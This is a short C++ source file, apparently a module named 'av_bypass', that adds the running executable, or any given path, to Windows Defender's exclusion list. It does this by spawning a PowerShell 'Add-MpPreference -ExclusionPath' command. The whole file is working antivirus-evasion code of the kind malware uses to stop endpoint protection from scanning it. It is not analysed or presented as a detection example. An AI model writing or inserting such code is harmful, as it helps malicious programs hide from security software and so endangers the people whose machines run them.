//
// Created by MateuszAndruszkiewic on 17.12.2024.
//
#include "../../../lib/beauty_print.cpp"
#include "av_bypass.h"
#include <windows.h>
#include <iostream>
#include <string>

bool AddToDefenderExclusions(const std::wstring& path) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    std::wstring command = L"powershell Add-MpPreference -ExclusionPath \"" + path + L"\"";

    if (!CreateProcessW(nullptr, &command[0], nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

bool AddCurrentExecutableToDefenderExclusions() {
    wchar_t filePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, filePath, MAX_PATH) != 0) {
        return AddToDefenderExclusions(filePath);
    }
    return false;
}